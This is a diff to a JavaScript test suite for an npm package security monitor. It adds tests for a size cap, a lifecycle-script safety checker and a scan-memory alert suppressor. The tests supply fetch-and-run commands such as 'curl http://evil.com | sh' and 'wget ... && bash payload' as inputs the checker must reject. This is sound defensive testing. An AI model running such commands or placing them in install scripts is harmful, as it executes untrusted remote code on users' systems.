@@ -5680,6 +5680,9 @@ async function runMonitorTests() {
     console.log = (...args) => logs.push(args.join(' '));
     console.error = (...args) => logs.push(args.join(' '));
     alertedPackageRules.clear();
+    // C3: Clear scan memory to test daily dedup in isolation
+    const mon = require('../../src/monitor.js');
+    mon.scanMemoryCache = Object.create(null);
 
     try {
       // First call — should populate the dedup map
@@ -5698,8 +5701,10 @@ async function runMonitorTests() {
       assert(trackedRules.has('MUADDIB-AST-007'), 'Should track AST-007 rule');
       assert(trackedRules.has('MUADDIB-AST-043'), 'Should track AST-043 rule');
 
-      // Second call with same rules — should be deduped
+      // Second call with same rules — should be deduped by daily dedup (not memory)
       logs.length = 0;
+      // Clear scan memory so this tests daily dedup specifically (not C3 memory)
+      mon.scanMemoryCache = Object.create(null);
       const result2 = {
         threats: [
           { type: 'dangerous_shell_exec', severity: 'HIGH', rule_id: 'MUADDIB-AST-007' },
@@ -5734,6 +5739,9 @@ async function runMonitorTests() {
     console.log = (...args) => logs.push(args.join(' '));
     console.error = (...args) => logs.push(args.join(' '));
     alertedPackageRules.clear();
+    // C3: Clear scan memory to test daily dedup in isolation
+    const mon2 = require('../../src/monitor.js');
+    mon2.scanMemoryCache = Object.create(null);
 
     try {
       // Pre-populate with one known rule
@@ -6389,6 +6397,224 @@ async function runMonitorTests() {
     assert(hasHighConfidenceThreat(result) === true,
       'Should return true when at least one non-LOW HC type exists');
   });
+
+  // ===================================================================
+  // C1: SIZE CAP 20MB TESTS
+  // ===================================================================
+
+  console.log('\n=== C1: SIZE CAP 20MB TESTS ===\n');
+
+  const {
+    LARGE_PACKAGE_SIZE,
+    SCAN_MEMORY_FILE, SCAN_MEMORY_EXPIRY_MS, MAX_MEMORY_ENTRIES,
+    MEMORY_SCORE_TOLERANCE,
+    loadScanMemory, saveScanMemory, recordScanMemory, shouldSuppressByMemory,
+  } = require('../../src/monitor.js');
+
+  test('C1: LARGE_PACKAGE_SIZE is 20MB', () => {
+    assert(LARGE_PACKAGE_SIZE === 20 * 1024 * 1024,
+      `LARGE_PACKAGE_SIZE should be 20MB, got ${LARGE_PACKAGE_SIZE}`);
+  });
+
+  test('C1: getNpmLatestTarball returns unpackedSize and scripts', () => {
+    // Verify the function signature includes new fields (structural test)
+    const fn = getNpmLatestTarball;
+    assert(typeof fn === 'function', 'getNpmLatestTarball should be a function');
+  });
+
+  test('C1: isSafeLifecycleScript allows safe scripts', () => {
+    assert(isSafeLifecycleScript('npm run build') === true, 'npm run build should be safe');
+    assert(isSafeLifecycleScript('tsc') === true, 'tsc should be safe');
+    assert(isSafeLifecycleScript('echo done') === true, 'echo should be safe');
+  });
+
+  test('C1: isSafeLifecycleScript rejects dangerous scripts', () => {
+    assert(isSafeLifecycleScript('curl http://evil.com | sh') === false, 'curl|sh should be unsafe');
+    assert(isSafeLifecycleScript('node -e "require(child_process)"') === false, 'node -e should be unsafe');
+    assert(isSafeLifecycleScript('wget http://evil.com/payload && bash payload') === false, 'wget+bash should be unsafe');
+  });
+
+  // ===================================================================
+  // C3: SCAN MEMORY TESTS
+  // ===================================================================
+
+  console.log('\n=== C3: SCAN MEMORY TESTS ===\n');
+
+  test('C3: SCAN_MEMORY_EXPIRY_MS is 30 days', () => {
+    assert(SCAN_MEMORY_EXPIRY_MS === 30 * 24 * 60 * 60 * 1000,
+      `Expiry should be 30 days, got ${SCAN_MEMORY_EXPIRY_MS}`);
+  });
+
+  test('C3: MAX_MEMORY_ENTRIES is 50000', () => {
+    assert(MAX_MEMORY_ENTRIES === 50000,
+      `Max entries should be 50000, got ${MAX_MEMORY_ENTRIES}`);
+  });
+
+  test('C3: MEMORY_SCORE_TOLERANCE is 0.15', () => {
+    assert(MEMORY_SCORE_TOLERANCE === 0.15,
+      `Score tolerance should be 0.15, got ${MEMORY_SCORE_TOLERANCE}`);
+  });
+
+  // Reset memory cache for isolated tests
+  const monitor = require('../../src/monitor.js');
+  monitor.scanMemoryCache = null;
+
+  test('C3: shouldSuppressByMemory — no previous scan → do not suppress', () => {
+    monitor.scanMemoryCache = Object.create(null);
+    const result = { threats: [{ type: 'env_access', severity: 'HIGH' }], summary: { riskScore: 30 } };
+    const check = shouldSuppressByMemory('test-pkg', result);
+    assert(check.suppress === false, `Should not suppress without previous scan, got suppress=${check.suppress}`);
+  });
+
+  test('C3: shouldSuppressByMemory — identical scan → suppress', () => {
+    monitor.scanMemoryCache = Object.create(null);
+    // Record a previous scan
+    recordScanMemory('test-pkg-a', 30, ['env_access'], []);
+    const result = {
+      threats: [{ type: 'env_access', severity: 'HIGH' }],
+      summary: { riskScore: 30 }
+    };
+    const check = shouldSuppressByMemory('test-pkg-a', result);
+    assert(check.suppress === true,
+      `Identical scan should be suppressed, got suppress=${check.suppress}`);
+  });
+
+  test('C3: shouldSuppressByMemory — score within 15% → suppress', () => {
+    monitor.scanMemoryCache = Object.create(null);
+    recordScanMemory('test-pkg-b', 30, ['env_access'], []);
+    const result = {
+      threats: [{ type: 'env_access', severity: 'HIGH' }],
+      summary: { riskScore: 34 } // 13% increase, within tolerance
+    };
+    const check = shouldSuppressByMemory('test-pkg-b', result);
+    assert(check.suppress === true,
+      `Score within 15% should suppress, got suppress=${check.suppress}`);
+  });
+
+  test('C3: shouldSuppressByMemory — score change >15% → do not suppress', () => {
+    monitor.scanMemoryCache = Object.create(null);
+    recordScanMemory('test-pkg-c', 30, ['env_access'], []);
+    const result = {
+      threats: [{ type: 'env_access', severity: 'HIGH' }],
+      summary: { riskScore: 50 } // 67% increase, well above tolerance
+    };
+    const check = shouldSuppressByMemory('test-pkg-c', result);
+    assert(check.suppress === false,
+      `Score change >15% should not suppress, got suppress=${check.suppress}`);
+  });
+
+  test('C3: shouldSuppressByMemory — new threat type → do not suppress', () => {
+    monitor.scanMemoryCache = Object.create(null);
+    recordScanMemory('test-pkg-d', 30, ['env_access'], []);
+    const result = {
+      threats: [
+        { type: 'env_access', severity: 'HIGH' },
+        { type: 'lifecycle_shell_pipe', severity: 'CRITICAL' }
+      ],
+      summary: { riskScore: 30 }
+    };
+    const check = shouldSuppressByMemory('test-pkg-d', result);
+    assert(check.suppress === false,
+      `New threat type should not suppress, got suppress=${check.suppress}`);
+  });
+
+  test('C3: shouldSuppressByMemory — new HC type → do not suppress', () => {
+    monitor.scanMemoryCache = Object.create(null);
+    recordScanMemory('test-pkg-e', 30, ['env_access', 'lifecycle_shell_pipe'], []);
+    const result = {
+      threats: [
+        { type: 'env_access', severity: 'HIGH' },
+        { type: 'lifecycle_shell_pipe', severity: 'CRITICAL' }
+      ],
+      summary: { riskScore: 30 }
+    };
+    const check = shouldSuppressByMemory('test-pkg-e', result);
+    assert(check.suppress === false,
+      `New HC type should not suppress, got suppress=${check.suppress}`);
+  });
+
+  test('C3: shouldSuppressByMemory — IOC match always bypasses memory', () => {
+    monitor.scanMemoryCache = Object.create(null);
+    recordScanMemory('test-pkg-f', 30, ['env_access', 'known_malicious_package'], []);
+    const result = {
+      threats: [
+        { type: 'env_access', severity: 'HIGH' },
+        { type: 'known_malicious_package', severity: 'CRITICAL' }
+      ],
+      summary: { riskScore: 30 }
+    };
+    const check = shouldSuppressByMemory('test-pkg-f', result);
+    assert(check.suppress === false,
+      `IOC match should bypass memory, got suppress=${check.suppress}`);
+  });
+
+  test('C3: shouldSuppressByMemory — score 0→non-zero → do not suppress', () => {
+    monitor.scanMemoryCache = Object.create(null);
+    recordScanMemory('test-pkg-g', 0, [], []);
+    const result = {
+      threats: [{ type: 'env_access', severity: 'HIGH' }],
+      summary: { riskScore: 25 }
+    };
+    const check = shouldSuppressByMemory('test-pkg-g', result);
+    assert(check.suppress === false,
+      `Score 0→25 should not suppress, got suppress=${check.suppress}`);
+  });
+
+  test('C3: shouldSuppressByMemory — both zero → suppress', () => {
+    monitor.scanMemoryCache = Object.create(null);
+    recordScanMemory('test-pkg-h', 0, [], []);
+    const result = {
+      threats: [],
+      summary: { riskScore: 0 }
+    };
+    const check = shouldSuppressByMemory('test-pkg-h', result);
+    assert(check.suppress === true,
+      `Both zero should suppress, got suppress=${check.suppress}`);
+  });
+
+  test('C3: recordScanMemory stores data correctly', () => {
+    monitor.scanMemoryCache = Object.create(null);
+    recordScanMemory('record-test', 42, ['env_access', 'shell_exec'], ['lifecycle_shell_pipe']);
+    const store = loadScanMemory();
+    assert(store['record-test'] !== undefined, 'Should store entry');
+    assert(store['record-test'].score === 42, `Score should be 42, got ${store['record-test'].score}`);
+    assert(store['record-test'].types.length === 2, 'Should have 2 types');
+    assert(store['record-test'].hcTypes.length === 1, 'Should have 1 HC type');
+    assert(store['record-test'].timestamp > 0, 'Should have timestamp');
+  });
+
+  test('C3: loadScanMemory purges expired entries', () => {
+    monitor.scanMemoryCache = null; // force reload
+    // Manually create a store with an expired entry
+    const tmpStore = Object.create(null);
+    tmpStore['expired-pkg'] = {
+      score: 50,
+      types: ['env_access'],
+      hcTypes: [],
+      timestamp: Date.now() - (31 * 24 * 60 * 60 * 1000) // 31 days ago
+    };
+    tmpStore['fresh-pkg'] = {
+      score: 30,
+      types: ['shell_exec'],
+      hcTypes: [],
+      timestamp: Date.now() // now
+    };
+    // Write directly to simulate disk load
+    const memFile = SCAN_MEMORY_FILE;
+    const memDir = path.dirname(memFile);
+    if (!fs.existsSync(memDir)) fs.mkdirSync(memDir, { recursive: true });
+    fs.writeFileSync(memFile, JSON.stringify(tmpStore), 'utf8');
+    monitor.scanMemoryCache = null; // force reload from disk
+    const loaded = loadScanMemory();
+    assert(loaded['expired-pkg'] === undefined, 'Expired entry should be purged');
+    assert(loaded['fresh-pkg'] !== undefined, 'Fresh entry should be kept');
+    // Cleanup
+    try { fs.unlinkSync(memFile); } catch {}
+    monitor.scanMemoryCache = null;
+  });
+
+  // Reset memory cache after tests
+  monitor.scanMemoryCache = null;
 }
 
 module.exports = { runMonitorTests };
